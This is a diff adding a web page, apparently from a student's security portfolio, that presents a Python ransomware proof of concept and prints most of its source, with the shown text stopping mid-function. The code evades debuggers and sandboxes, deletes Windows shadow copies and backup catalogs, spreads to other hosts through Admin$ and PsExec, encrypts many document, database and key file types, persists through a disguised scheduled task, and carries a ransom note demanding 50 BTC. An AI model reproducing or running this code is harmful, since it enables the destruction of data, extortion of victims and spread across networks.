@@ -1,0 +1,629 @@
+---
+import Layout from "../../layouts/Layout.astro"
+import SectionContainer from "../../components/SectionContainer.astro"
+import TitleSection from "../../components/TitleSection.astro"
+import CodeIcon from "../../components/Icons/Code.astro"
+import Link from "../../components/Icons/Link.astro"
+
+// ── Íconos
+import Shield from "../../components/Icons/Shield.astro"
+import Bolt from "../../components/Icons/Bolt.astro"
+import Security from "../../components/Icons/Security.astro"
+import Spy from "../../components/Icons/Spy.astro"
+import Key from "../../components/Icons/Key.astro"
+import Bug from "../../components/Icons/Virus.astro" 
+import Settings from "../../components/Icons/Settings.astro"
+import Wifi from "../../components/Icons/Wifi.astro" 
+
+const INFO_TAREA = {
+  titulo: "Actividad 14: Anatomía de un Ransomware — Desarrollo y Análisis",
+  fecha: "05 de Abril, 2026",
+  descripcion: "Diseño, desarrollo y análisis de la cadena de ejecución de un Ransomware en Python. Implementación de evasión de defensas, bomba lógica, cifrado intermitente, inhibición de copias de seguridad y movimiento lateral.",
+  pdf: "", // Sin PDF para esta actividad
+  imagen1: "/projects/Imagen1Tarea14.png",
+  imagen2: "/projects/Imagen2Tarea14.png"
+}
+---
+
+<Layout
+  title={`Portafolio - ${INFO_TAREA.titulo}`}
+  description={INFO_TAREA.descripcion}
+>
+  <style>
+    :global(header) {
+      display: none !important;
+    }
+  </style>
+
+  <main class="px-4">
+    <SectionContainer class="py-16 md:py-20">
+
+      {/* --- ENCABEZADO --- */}
+      <TitleSection>
+        <CodeIcon class="size-8" />
+        {INFO_TAREA.titulo}
+      </TitleSection>
+
+      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
+        📅 Entregado el: {INFO_TAREA.fecha}
+      </p>
+
+      {/* Banner THREAT LEVEL */}
+      <div class="mb-10 flex items-center gap-3 px-4 py-3 rounded-lg bg-red-950/60 border border-red-500/50">
+        <Bug class="size-5 text-red-500 shrink-0 animate-pulse" />
+        <p class="text-red-300 text-sm font-bold">
+          [ALERTA DE SEGURIDAD] — Payload Criptográfico Activo. Extorsión e impacto destructivo en el sistema.
+        </p>
+        <span class="ml-auto text-xs font-mono text-red-500/80 hidden sm:block">THREAT: RANSOMWARE</span>
+      </div>
+
+      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">
+
+        {/* ── CONCEPTO CLAVE ── */}
+        <div>
+          <p class="text-xs font-mono text-gray-500 mb-1">// ANÁLISIS ESTRUCTURAL DE MALWARE</p>
+          <h3 class="text-xl font-semibold mb-3 text-red-500/90">Anatomía de un Ransomware</h3>
+          <p>
+            Un <strong>Ransomware</strong> es una pieza de software malicioso diseñada para denegar el acceso a un sistema informático o a los datos que contiene (secuestro digital), exigiendo el pago de un rescate (generalmente en criptomonedas) para su liberación. Su impacto ataca directamente el pilar de la <strong>Disponibilidad</strong> en la tríada CIA.
+          </p>
+          <p class="mt-3">
+            El ransomware moderno rara vez es un simple script de cifrado; funciona como una infraestructura compleja. En esta actividad se desarrolló una prueba de concepto (PoC) en Python que abarca todas las fases de la <em>Cyber Kill Chain</em> de un ransomware avanzado: desde el engaño inicial y la evasión de entornos aislados (Sandbox), hasta el cifrado y la extorsión interactiva mediante interfaz gráfica.
+          </p>
+        </div>
+
+        {/* ── MATRIZ DE FUNCIONES (KIL CHAIN) ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Settings class="size-6 text-gray-400" />
+            Vectores Ofensivos Implementados
+          </h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-red-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Spy class="size-5 text-red-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Evasión y Anti-Análisis</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Verifica si hay depuradores activos, audita los recursos de hardware (RAM/CPU) y escanea direcciones MAC para detectar hipervisores (VMware/VirtualBox). Incluye un ataque de tiempo para evadir Sandboxes.
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-yellow-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Bolt class="size-5 text-yellow-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Inhibición de Recuperación</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Ejecuta comandos silenciosos (<code>vssadmin</code> y <code>wbadmin</code>) para purgar las <em>Shadow Copies</em> de Windows y los catálogos de copias de seguridad locales, asegurando que la víctima no pueda restaurar el sistema.
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-purple-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Wifi class="size-5 text-purple-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Movimiento Lateral</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Escanea la subred usando paquetes ICMP, localiza hosts activos y utiliza el recurso compartido <code>Admin$</code> junto con <strong>PsExec</strong> para ejecutar la carga útil en otros equipos de la red.
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-blue-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Key class="size-5 text-blue-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Cifrado Intermitente</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                En lugar de cifrar todo el archivo (lento), salta en bloques de 10MB y cifra solo 10KB. Esto maximiza la velocidad de destrucción e impide la recuperación del archivo original, alterando su extensión a <code>.osvaldo</code>.
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-green-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Security class="size-5 text-green-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Bomba Lógica y Persistencia</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Se copia a sí mismo en <code>AppData</code> y crea una tarea programada. Permanece inactivo hasta que el reloj del sistema coincide con la fecha detonante (<em>Marker</em>).
+              </p>
+            </div>
+
+            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-orange-500/40 transition-all">
+              <div class="flex items-center gap-2 mb-2">
+                <Settings class="size-5 text-orange-400 shrink-0" />
+                <p class="font-bold text-gray-200 text-xs">Extorsión (Pantalla de Bloqueo)</p>
+              </div>
+              <p class="text-gray-400 text-xs leading-relaxed">
+                Usa hilos concurrentes para cifrar en segundo plano mientras lanza una interfaz gráfica en pantalla completa con <code>tkinter</code> que oculta el cursor y despliega la nota de rescate en rojo.
+              </p>
+            </div>
+
+          </div>
+        </div>
+
+        {/* ── CÓDIGO FUENTE DEL PAYLOAD COMPLETO ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Código Fuente: Prueba de Concepto (PoC)</h3>
+          <p class="mb-4 text-sm text-gray-400">
+            A continuación se presenta el código fuente completo del Ransomware desarrollado. Este script centraliza la lógica de ataque, desde el engaño inicial hasta la concurrencia multihilo para el cifrado masivo:
+          </p>
+
+          <div class="relative bg-[#0d1117] text-gray-300 rounded-lg shadow-xl overflow-hidden border border-gray-700">
+            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+              <div class="w-3 h-3 rounded-full bg-red-500"></div>
+              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+              <div class="w-3 h-3 rounded-full bg-green-500"></div>
+              <span class="ml-2 text-xs text-gray-400 font-mono">python — osvaldo_ransomware_poc.py</span>
+            </div>
+            {/* Contenedor con Scroll para código largo */}
+            <div class="p-4 overflow-y-auto max-h-[600px] overflow-x-auto custom-scrollbar">
+              <pre class="font-mono text-xs leading-relaxed">
+<span class="text-purple-400">import</span> os
+<span class="text-purple-400">import</span> sys
+<span class="text-purple-400">import</span> time
+<span class="text-purple-400">import</span> uuid
+<span class="text-purple-400">import</span> psutil
+<span class="text-purple-400">import</span> ctypes
+<span class="text-purple-400">import</span> shutil
+<span class="text-purple-400">import</span> socket
+<span class="text-purple-400">import</span> platform
+<span class="text-purple-400">import</span> subprocess
+<span class="text-purple-400">import</span> base64
+<span class="text-purple-400">import</span> threading
+<span class="text-purple-400">import</span> hashlib  
+<span class="text-purple-400">import</span> string
+<span class="text-purple-400">import</span> tkinter <span class="text-purple-400">as</span> tk
+<span class="text-purple-400">from</span> concurrent.futures <span class="text-purple-400">import</span> ThreadPoolExecutor
+
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-gray-500"># CONFIGURACIÓN ADVERSARIA (Equipo 5 - UPSLP)</span>
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-gray-500"># Este diccionario almacena todas las variables estáticas del malware.</span>
+<span class="text-gray-500"># Mantener esto en un solo lugar facilita la modificación rápida (polimorfismo básico).</span>
+CONFIG = &#123;
+    <span class="text-gray-500"># Lista de extensiones de alto valor (bases de datos, documentos, certificados)</span>
+    <span class="text-green-400">"extensions"</span>: [
+        <span class="text-green-400">".docx"</span>, <span class="text-green-400">".xlsx"</span>, <span class="text-green-400">".xls"</span>, <span class="text-green-400">".pdf"</span>, <span class="text-green-400">".rtf"</span>, <span class="text-green-400">".txt"</span>, <span class="text-green-400">".csv"</span>,
+        <span class="text-green-400">".sql"</span>, <span class="text-green-400">".mdf"</span>, <span class="text-green-400">".ldf"</span>, <span class="text-green-400">".ndf"</span>, <span class="text-green-400">".db"</span>, <span class="text-green-400">".dbf"</span>, <span class="text-green-400">".sqlite"</span>, <span class="text-green-400">".accdb"</span>, <span class="text-green-400">".ora"</span>, <span class="text-green-400">".bd"</span>,
+        <span class="text-green-400">".bak"</span>, <span class="text-green-400">".bkp"</span>, <span class="text-green-400">".tmp"</span>, <span class="text-green-400">".tar.gz"</span>, <span class="text-green-400">".zip"</span>, <span class="text-green-400">".rar"</span>, <span class="text-green-400">".7z"</span>,
+        <span class="text-green-400">".vmdk"</span>, <span class="text-green-400">".vhdx"</span>, <span class="text-green-400">".vdi"</span>,
+        <span class="text-green-400">".kdbx"</span>, <span class="text-green-400">".pem"</span>, <span class="text-green-400">".crt"</span>, <span class="text-green-400">".cer"</span>, <span class="text-green-400">".pfx"</span>, <span class="text-green-400">".p12"</span>, <span class="text-green-400">".ovpn"</span>, <span class="text-green-400">".pcf"</span>,
+        <span class="text-green-400">".config"</span>, <span class="text-green-400">".xml"</span>, <span class="text-green-400">".ini"</span>, <span class="text-green-400">".json"</span>, <span class="text-green-400">".edi"</span>, <span class="text-green-400">".bai"</span>, <span class="text-green-400">".bai2"</span>, <span class="text-green-400">".mt940"</span>, <span class="text-green-400">".ofx"</span>, <span class="text-green-400">".qfx"</span>, <span class="text-green-400">".qbo"</span>, <span class="text-green-400">".dat"</span>, <span class="text-green-400">".seq"</span>,
+        <span class="text-green-400">".ps1"</span>, <span class="text-green-400">".bat"</span>, <span class="text-green-400">".sh"</span>, <span class="text-green-400">".vbs"</span>
+    ],
+    <span class="text-gray-500"># Mensaje de extorsión que leerá la víctima</span>
+    <span class="text-green-400">"note"</span>: <span class="text-green-400">"""=========================================================
+警告：你的整个网络已被攻陷。
+=========================================================
+
+你的所有核心数据库、财务记录和备份都已被军事级算法加密。
+这不仅仅是一个锁定程序；我们已经下载了超过 500GB 的高度机密数据。
+
+不要试图寻找漏洞或联系安全专家。
+如果你尝试使用第三方软件解密、重启服务器或联系执法部门，
+解密密钥将被我们的自动化系统永久销毁。
+
+你有 48小时 的时间将 50 BTC 转移到以下钱包地址。
+倒计时已经开始。我们只在乎钱。"""</span>,
+    <span class="text-gray-500"># Bomba Lógica: Fecha y hora exacta de detonación (MODIFICADO PARA VIDEO)</span>
+    <span class="text-green-400">"marker"</span>: <span class="text-green-400">"2026-04-30 15:00"</span>, 
+    <span class="text-gray-500"># Ruta donde el malware espera encontrar la herramienta de Microsoft para movimiento lateral</span>
+    <span class="text-green-400">"psexec_path"</span>: <span class="text-green-400">"C:\\Windows\\Temp\\psexec.exe"</span>, 
+    <span class="text-gray-500"># Llave Pública del atacante (Usada para cifrar la llave simétrica en la víctima)</span>
+    <span class="text-green-400">"attacker_public_key"</span>: <span class="text-green-400">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."</span>,
+    <span class="text-gray-500"># Nombre del archivo señuelo (Ingeniería Social)</span>
+    <span class="text-green-400">"imagen_contenedor"</span>: <span class="text-green-400">"cuponera.jpeg"</span>
+&#125;
+
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-gray-500"># FUNCIONES DE APOYO Y ENGAÑO</span>
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-purple-400">def</span> <span class="text-yellow-200">abrir_contenedor_esteganografico</span>():
+    <span class="text-green-400">""" 
+    Fase de Ingeniería Social (Señuelo).
+    Abre una imagen legítima para engañar a la víctima mientras el malware corre en segundo plano.
+    """</span>
+    <span class="text-purple-400">try</span>:
+        <span class="text-gray-500"># Obtiene la ruta de donde se está ejecutando el .exe</span>
+        base_path = os.path.dirname(os.path.abspath(sys.executable))
+        ruta_imagen = os.path.join(base_path, CONFIG[<span class="text-green-400">"imagen_contenedor"</span>])
+        
+        <span class="text-gray-500"># Fallback: si no la encuentra, busca en el directorio de trabajo actual</span>
+        <span class="text-purple-400">if not</span> os.path.exists(ruta_imagen):
+            ruta_imagen = os.path.join(os.getcwd(), CONFIG[<span class="text-green-400">"imagen_contenedor"</span>])
+
+        <span class="text-gray-500"># Ejecuta la imagen usando la aplicación predeterminada de Windows</span>
+        <span class="text-purple-400">if</span> os.path.exists(ruta_imagen):
+            os.startfile(ruta_imagen)
+    <span class="text-purple-400">except</span>:
+        <span class="text-purple-400">pass</span> <span class="text-gray-500"># Si falla, ignora el error para no alertar al usuario</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">setup_crypto</span>():
+    <span class="text-green-400">""" 
+    Fase 06: Preparación Criptográfica.
+    Genera la llave de cifrado de los archivos y la protege.
+    """</span>
+    <span class="text-gray-500"># 1. Genera una llave simétrica (AES) aleatoria de 32 bytes (256 bits) en memoria RAM</span>
+    session_key = os.urandom(<span class="text-orange-400">32</span>) 
+    
+    <span class="text-gray-500"># 2. Simulación de cifrado asimétrico (RSA): </span>
+    <span class="text-gray-500"># Une un hash SHA-256 de la llave con la llave misma y lo codifica en Base64.</span>
+    <span class="text-gray-500"># En la vida real, aquí se cifraría 'session_key' usando 'attacker_public_key'.</span>
+    encrypted_session_key = base64.b64encode(hashlib.sha256(session_key).digest() + session_key) 
+    
+    <span class="text-gray-500"># Define la ruta para guardar la llave cifrada en la carpeta AppData del usuario</span>
+    ruta_clave = os.path.join(os.getenv(<span class="text-green-400">'APPDATA'</span>) <span class="text-purple-400">if</span> platform.system() == <span class="text-green-400">"Windows"</span> <span class="text-purple-400">else</span> <span class="text-green-400">"/tmp"</span>, <span class="text-green-400">"system_k.dat"</span>)
+    <span class="text-purple-400">try</span>:
+        <span class="text-gray-500"># Guarda la llave cifrada en el disco. Sin la clave privada del atacante, esto es ilegible.</span>
+        <span class="text-purple-400">with</span> <span class="text-yellow-300">open</span>(ruta_clave, <span class="text-green-400">"wb"</span>) <span class="text-purple-400">as</span> f:
+            f.write(encrypted_session_key)
+    <span class="text-purple-400">except Exception</span>:
+        <span class="text-purple-400">pass</span>
+        
+    <span class="text-purple-400">return</span> session_key <span class="text-gray-500"># Devuelve la llave plana en memoria para que el malware la use al cifrar</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">anti_analisis</span>():
+    <span class="text-green-400">""" 
+    Fase 03: Validación del Entorno (Evasión de Defensas).
+    Verifica si el malware está siendo analizado por investigadores o antivirus.
+    """</span>
+    <span class="text-gray-500"># Verifica si un depurador (Debugger) está adherido al proceso usando la API de Windows</span>
+    <span class="text-purple-400">if</span> ctypes.windll.kernel32.IsDebuggerPresent(): 
+        sys.exit() <span class="text-gray-500"># Suicidio del proceso</span>
+        
+    <span class="text-gray-500"># Verifica los recursos de hardware. Las máquinas virtuales de análisis suelen tener bajos recursos.</span>
+    ram_total = psutil.virtual_memory().total / (<span class="text-orange-400">1024**3</span>) <span class="text-gray-500"># Mide RAM en GB</span>
+    nucleos_cpu = os.cpu_count() <span class="text-gray-500"># Cuenta núcleos lógicos</span>
+    
+    <span class="text-gray-500"># PARCHE PARA VIDEO: Comentado para permitir ejecución en VirtualBox</span>
+    <span class="text-gray-500"># if ram_total &lt; 4.0 or nucleos_cpu &lt; 2:</span>
+    <span class="text-gray-500">#     sys.exit() # Suicidio si tiene menos de 4GB RAM o menos de 2 núcleos</span>
+        
+    <span class="text-gray-500"># Extrae la dirección MAC de la tarjeta de red</span>
+    mac = <span class="text-green-400">':'</span>.join([<span class="text-green-400">'&#123;:02x&#125;'</span>.format((uuid.getnode() &gt;&gt; ele) &amp; <span class="text-orange-400">0xff</span>) <span class="text-purple-400">for</span> ele <span class="text-purple-400">in</span> <span class="text-yellow-300">range</span>(<span class="text-orange-400">0</span>,<span class="text-orange-400">8*6</span>,<span class="text-orange-400">8</span>)][::-<span class="text-orange-400">1</span>])
+    <span class="text-gray-500"># Lista de prefijos MAC (OUI) pertenecientes a VMware y VirtualBox</span>
+    mac_prohibidas = [<span class="text-green-400">"08:00:27"</span>, <span class="text-green-400">"00:05:69"</span>, <span class="text-green-400">"00:0c:29"</span>, <span class="text-green-400">"00:50:56"</span>]
+    
+    <span class="text-gray-500"># PARCHE PARA VIDEO: Comentado para permitir ejecución en VirtualBox</span>
+    <span class="text-gray-500"># for prefijo in mac_prohibidas:</span>
+    <span class="text-gray-500">#     if mac.startswith(prefijo):</span>
+    <span class="text-gray-500">#         sys.exit() # Suicidio si detecta que está en un hipervisor conocido</span>
+            
+    <span class="text-gray-500"># Evasión de Sandbox (Ataque de Tiempo)</span>
+    inicio = time.time()
+    time.sleep(<span class="text-orange-400">3</span>) <span class="text-gray-500"># Duerme el proceso 3 segundos reales</span>
+    <span class="text-gray-500"># Si la Sandbox aceleró el tiempo (para analizar rápido), la resta será menor a 2.5</span>
+    <span class="text-purple-400">if</span> (time.time() - inicio) &lt; <span class="text-orange-400">2.5</span>: 
+        sys.exit() <span class="text-gray-500"># Suicidio al detectar manipulación del tiempo</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">inhibir_recuperacion</span>():
+    <span class="text-green-400">""" 
+    Elimina las copias de seguridad locales del sistema operativo para forzar el pago.
+    """</span>
+    comandos = [
+        <span class="text-green-400">"vssadmin.exe delete shadows /all /quiet"</span>, <span class="text-gray-500"># Borra Shadow Copies de Windows</span>
+        <span class="text-green-400">"wbadmin delete catalog -quiet"</span>            <span class="text-gray-500"># Borra el catálogo de copias de seguridad</span>
+    ]
+    <span class="text-gray-500"># Ejecuta los comandos en la consola (cmd) de manera silenciosa</span>
+    <span class="text-purple-400">for</span> cmd <span class="text-purple-400">in</span> comandos:
+        subprocess.run(cmd, shell=<span class="text-orange-400">True</span>, capture_output=<span class="text-orange-400">True</span>)
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">descubrir_red</span>():
+    <span class="text-green-400">""" 
+    Fase de Reconocimiento. 
+    Escanea la subred local buscando otras computadoras encendidas.
+    """</span>
+    ips_activas = []
+    <span class="text-purple-400">try</span>:
+        <span class="text-gray-500"># Truco para obtener la IP local enviando un paquete UDP simulado a Google</span>
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((<span class="text-green-400">"8.8.8.8"</span>, <span class="text-orange-400">80</span>))
+        ip_local = s.getsockname()[<span class="text-orange-400">0</span>]
+        s.close()
+        
+        <span class="text-gray-500"># Extrae los primeros 3 octetos (ej. 192.168.1.)</span>
+        subred = <span class="text-green-400">"."</span>.join(ip_local.split(<span class="text-green-400">"."</span>)[:-<span class="text-orange-400">1</span>]) + <span class="text-green-400">"."</span>
+        
+        <span class="text-gray-500"># Escanea un rango pequeño de IPs (del .1 al .19 para hacer menos ruido)</span>
+        <span class="text-purple-400">for</span> i <span class="text-purple-400">in</span> <span class="text-yellow-300">range</span>(<span class="text-orange-400">1</span>, <span class="text-orange-400">20</span>): 
+            ip_objetivo = <span class="text-green-400">f"&#123;subred&#125;&#123;i&#125;"</span>
+            <span class="text-purple-400">if</span> ip_objetivo == ip_local: <span class="text-purple-400">continue</span> <span class="text-gray-500"># Ignora la IP propia</span>
+            
+            <span class="text-gray-500"># Envía un Ping (ICMP) con tiempo de espera muy corto (100ms)</span>
+            cmd_ping = <span class="text-green-400">f"ping -n 1 -w 100 &#123;ip_objetivo&#125;"</span> <span class="text-purple-400">if</span> platform.system() == <span class="text-green-400">"Windows"</span> <span class="text-purple-400">else</span> <span class="text-green-400">f"ping -c 1 -W 1 &#123;ip_objetivo&#125;"</span>
+            resultado = subprocess.run(cmd_ping, shell=<span class="text-orange-400">True</span>, stdout=subprocess.DEVNULL)
+            
+            <span class="text-gray-500"># Si el ping responde correctamente (código 0), anota la IP como "viva"</span>
+            <span class="text-purple-400">if</span> resultado.returncode == <span class="text-orange-400">0</span>:
+                ips_activas.append(ip_objetivo)
+    <span class="text-purple-400">except Exception</span>:
+        <span class="text-purple-400">pass</span>
+    <span class="text-purple-400">return</span> ips_activas 
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">propagacion_red</span>(lista_ips):
+    <span class="text-green-400">""" 
+    Fase de Movimiento Lateral.
+    Intenta copiar y ejecutar el ransomware en otras máquinas descubiertas.
+    """</span>
+    ruta_malware = sys.executable <span class="text-gray-500"># Ruta del malware actual (.exe)</span>
+    <span class="text-purple-400">for</span> ip <span class="text-purple-400">in</span> lista_ips:
+        <span class="text-purple-400">try</span>:
+            <span class="text-gray-500"># Ruta administrativa oculta por defecto en Windows (Admin$)</span>
+            destino = <span class="text-green-400">f"\\\\&#123;ip&#125;\\Admin$\\temp_update.exe"</span>
+            <span class="text-gray-500"># Copia el malware a la computadora remota</span>
+            shutil.copy(ruta_malware, destino)
+            
+            <span class="text-gray-500"># Usa la herramienta PsExec de Sysinternals para ejecutar el malware copiado remotamente</span>
+            <span class="text-gray-500"># con máximos privilegios (-s para NT AUTHORITY\SYSTEM)</span>
+            comando = <span class="text-green-400">f"&#123;CONFIG['psexec_path']&#125; \\\\&#123;ip&#125; -s -d C:\\Windows\\temp_update.exe"</span>
+            subprocess.run(comando, shell=<span class="text-orange-400">True</span>, capture_output=<span class="text-orange-400">True</span>)
+        <span class="text-purple-400">except</span>:
+            <span class="text-purple-400">continue</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">cifrar_archivo_intermitente</span>(ruta, crypto_context):
+    <span class="text-green-400">""" 
+    Fase de Impacto.
+    Realiza un cifrado rápido alterando fragmentos del archivo en lugar de todo el archivo.
+    """</span>
+    <span class="text-purple-400">try</span>:
+        tamano = os.path.getsize(ruta)
+        <span class="text-gray-500"># Abre el archivo en modo Lectura/Escritura binaria</span>
+        <span class="text-purple-400">with</span> <span class="text-yellow-300">open</span>(ruta, <span class="text-green-400">"r+b"</span>) <span class="text-purple-400">as</span> f:
+            <span class="text-gray-500"># PARCHE PARA VIDEO: Salta en bloques de 10MB (10 * 1024 * 1024 bytes) para mayor velocidad</span>
+            <span class="text-purple-400">for</span> i <span class="text-purple-400">in</span> <span class="text-yellow-300">range</span>(<span class="text-orange-400">0</span>, tamano, <span class="text-orange-400">10 * 1024 * 1024</span>): 
+                f.seek(i) <span class="text-gray-500"># Se posiciona en el bloque</span>
+                chunk = f.read(<span class="text-orange-400">10240</span>) <span class="text-gray-500"># Lee solo 10KB de ese bloque</span>
+                transformed_data = <span class="text-yellow-300">bytearray</span>(chunk)
+                
+                <span class="text-gray-500"># Aplica una operación lógica XOR a los bytes usando la llave de sesión</span>
+                <span class="text-purple-400">for</span> j <span class="text-purple-400">in</span> <span class="text-yellow-300">range</span>(<span class="text-yellow-300">len</span>(transformed_data)):
+                    transformed_data[j] ^= crypto_context[j % <span class="text-yellow-300">len</span>(crypto_context)]
+                    
+                f.seek(i) <span class="text-gray-500"># Regresa a la posición original</span>
+                f.write(transformed_data) <span class="text-gray-500"># Sobrescribe los bytes alterados</span>
+                
+        <span class="text-gray-500"># Cambia la extensión original agregando la firma del atacante</span>
+        os.rename(ruta, ruta + <span class="text-green-400">".osvaldo"</span>)
+    <span class="text-purple-400">except</span>:
+        <span class="text-purple-400">pass</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">establecer_persistencia</span>():
+    <span class="text-green-400">""" 
+    Fase 04: Persistencia.
+    Garantiza que el malware sobreviva a reinicios anclándose al sistema operativo.
+    """</span>
+    appdata = os.getenv(<span class="text-green-400">'APPDATA'</span>)
+    destino = os.path.join(appdata, <span class="text-green-400">"sys_update.exe"</span>) <span class="text-gray-500"># Se oculta con nombre de "actualización"</span>
+    <span class="text-purple-400">if not</span> os.path.exists(destino):
+        <span class="text-purple-400">try</span>:
+            <span class="text-gray-500"># Se copia a sí mismo a una carpeta de sistema</span>
+            shutil.copy(sys.executable, destino)
+            <span class="text-gray-500"># Crea una Tarea Programada de Windows (schtasks) que se ejecutará cada vez que</span>
+            <span class="text-gray-500"># el usuario inicie sesión, asegurando que la bomba lógica siga activa.</span>
+            comando_tarea = <span class="text-green-400">f'schtasks /create /tn "MicrosoftUpdate" /tr "&#123;destino&#125;" /sc onlogon /rl highest /f'</span>
+            subprocess.run(comando_tarea, shell=<span class="text-orange-400">True</span>, capture_output=<span class="text-orange-400">True</span>)
+        <span class="text-purple-400">except</span>:
+            <span class="text-purple-400">pass</span>
+
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-gray-500"># ORQUESTACIÓN Y GUI</span>
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-purple-400">def</span> <span class="text-yellow-200">ataque_silencioso</span>():
+    <span class="text-green-400">""" 
+    Motor principal del ataque. Orquesta la recolección y cifrado de datos.
+    """</span>
+    anti_analisis() <span class="text-gray-500"># Ejecuta defensas</span>
+    clave_de_sesion = setup_crypto() <span class="text-gray-500"># Obtiene la llave plana</span>
+    
+    <span class="text-gray-500"># Verifica si tiene permisos de Administrador para tareas críticas</span>
+    <span class="text-purple-400">if</span> ctypes.windll.shell32.IsUserAnAdmin():
+        inhibir_recuperacion() 
+        equipos_vivos = descubrir_red()
+        <span class="text-purple-400">if</span> equipos_vivos:
+            propagacion_red(equipos_vivos) 
+    
+    objetivos = []
+    
+    <span class="text-gray-500"># Fase 05: DESCUBRIMIENTO LOCAL Y DE RED</span>
+    
+    <span class="text-gray-500"># 1. Agrega el perfil del usuario (Ej. C:\Users\Nombre) para máxima rapidez</span>
+    rutas_a_escanear = [os.path.expanduser(<span class="text-green-400">"~"</span>)]
+    
+    <span class="text-gray-500"># 2. Descubre unidades conectadas (Discos D:, USBs, o Unidades de Red Z:)</span>
+    <span class="text-purple-400">if</span> platform.system() == <span class="text-green-400">"Windows"</span>:
+        <span class="text-gray-500"># Itera sobre todas las letras del abecedario</span>
+        unidades_disponibles = [<span class="text-green-400">'%s:\\'</span> % d <span class="text-purple-400">for</span> d <span class="text-purple-400">in</span> string.ascii_uppercase <span class="text-purple-400">if</span> os.path.exists(<span class="text-green-400">'%s:\\'</span> % d)]
+        <span class="text-purple-400">for</span> unidad <span class="text-purple-400">in</span> unidades_disponibles:
+            <span class="text-gray-500"># Excluye la unidad C:\ para proteger la estabilidad del sistema operativo</span>
+            <span class="text-purple-400">if</span> unidad != <span class="text-green-400">"C:\\"</span> <span class="text-purple-400">and</span> unidad <span class="text-purple-400">not in</span> rutas_a_escanear:
+                rutas_a_escanear.append(unidad)
+
+    <span class="text-gray-500"># Inicia la recolección de rutas de archivos válidos</span>
+    <span class="text-purple-400">for</span> ruta <span class="text-purple-400">in</span> rutas_a_escanear:
+        <span class="text-gray-500"># Recorre todos los subdirectorios</span>
+        <span class="text-purple-400">for</span> root, dirs, files <span class="text-purple-400">in</span> os.walk(ruta): 
+            <span class="text-gray-500"># Excluye carpetas ocultas del sistema donde no hay documentos de usuario</span>
+            <span class="text-purple-400">if</span> <span class="text-yellow-300">any</span>(path <span class="text-purple-400">in</span> root <span class="text-purple-400">for</span> path <span class="text-purple-400">in</span> [<span class="text-green-400">"AppData"</span>, <span class="text-green-400">"Local Settings"</span>, <span class="text-green-400">"Application Data"</span>]):
+                <span class="text-purple-400">continue</span>
+            <span class="text-purple-400">for</span> f <span class="text-purple-400">in</span> files:
+                <span class="text-gray-500"># Si el archivo coincide con las extensiones del CONFIG, se enlista como objetivo</span>
+                <span class="text-purple-400">if</span> <span class="text-yellow-300">any</span>(f.endswith(ext) <span class="text-purple-400">for</span> ext <span class="text-purple-400">in</span> CONFIG[<span class="text-green-400">"extensions"</span>]):
+                    objetivos.append(os.path.join(root, f))
+
+    <span class="text-gray-500"># Ejecución Multihilo: Despliega un "equipo" de 20 trabajadores simultáneos </span>
+    <span class="text-gray-500"># para cifrar múltiples archivos al mismo tiempo, maximizando la velocidad.</span>
+    <span class="text-purple-400">with</span> ThreadPoolExecutor(max_workers=<span class="text-orange-400">20</span>) <span class="text-purple-400">as</span> executor:
+        executor.map(<span class="text-blue-400">lambda</span> obj: cifrar_archivo_intermitente(obj, clave_de_sesion), objetivos)
+
+    <span class="text-gray-500"># Suelta la nota de rescate en el Escritorio</span>
+    ruta_nota = os.path.join(os.path.expanduser(<span class="text-green-400">"~"</span>), <span class="text-green-400">"Desktop"</span>, <span class="text-green-400">"READ_ME_NOW.txt"</span>)
+    <span class="text-purple-400">try</span>:
